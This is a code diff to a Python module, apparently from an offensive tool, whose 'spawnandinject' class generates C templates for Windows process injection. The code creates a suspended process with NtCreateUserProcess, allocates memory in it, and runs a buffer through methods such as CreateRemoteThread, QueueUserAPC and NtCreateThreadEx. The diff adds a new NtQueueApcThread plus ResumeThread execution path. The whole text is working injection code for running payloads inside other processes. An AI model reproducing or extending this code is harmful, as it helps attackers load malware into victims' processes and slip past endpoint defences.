@@ -54,23 +54,11 @@ class spawnandinject:
 
     env = GetEnvironmentStringsW();
  
-    {RtlCreateProcessParametersEx}(
-        &procParams,
-        &image,
-        NULL,            /* DllPath        */
-        &curdir,        /* CurrentDirectory */
-        &cmdline,
-        env,            /* Environment    */
-        NULL,            /* WindowTitle    */
-        &desktop,
-        NULL,            /* ShellInfo      */
-        NULL,            /* RuntimeData    */
-        RTL_USER_PROC_PARAMS_NORMALIZED);
+    {RtlCreateProcessParametersEx}(&procParams, &image, NULL, &curdir, &cmdline, env, NULL, &desktop, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
  
     {NtCreateUserProcess}(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, procParams, &createInfo, &attrList);
 """).substitute(target=self.target)
             self.apicallsList += ['NtCreateUserProcess', 'RtlCreateProcessParametersEx', 'RtlInitUnicodeString']
-
 
         self.allocation = 'VirtualAllocEx'
         if 'allocation' in arguments:
@@ -134,10 +122,10 @@ class spawnandinject:
 
         self.execution = 'CreateRemoteThread'
         if 'execution' in arguments:
-            if arguments['execution'] in ['CreateRemoteThread', 'QueueUserAPC', 'SetThreadContext', 'NtCreateThreadEx']:
+            if arguments['execution'] in ['CreateRemoteThread', 'QueueUserAPC', 'SetThreadContext', 'NtCreateThreadEx', 'NtQueueApcThread']:
                 self.execution = arguments['execution']
             else:
-                print('Execution argument must be CreateRemoteThread, QueueUserAPC, SetThreadContext, or NtCreateThreadEx')
+                print('Execution argument must be CreateRemoteThread, QueueUserAPC, SetThreadContext, NtQueueApcThread, or NtCreateThreadEx')
                 exit(0)
         if self.execution == 'CreateRemoteThread':
             self.executionCode = """
@@ -169,6 +157,13 @@ class spawnandinject:
     {NtCreateThreadEx}(&newThread, THREAD_ALL_ACCESS, NULL, hProcess, buffer, NULL, 0, 0, 0, 0, NULL);
 """
             self.apicallsList += ['NtCreateThreadEx', 'WaitForSingleObject']
+        elif self.execution == 'NtQueueApcThread':
+            self.executionCode = """
+    //PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)buffer;
+    {NtQueueApcThread}(hThread, buffer, NULL, NULL, 0);
+    {ResumeThread}(hThread);
+"""
+            self.apicallsList += ['NtQueueApcThread', 'ResumeThread']
 
         self.wait = 'WaitForSingleObject'
         if 'wait' in arguments:
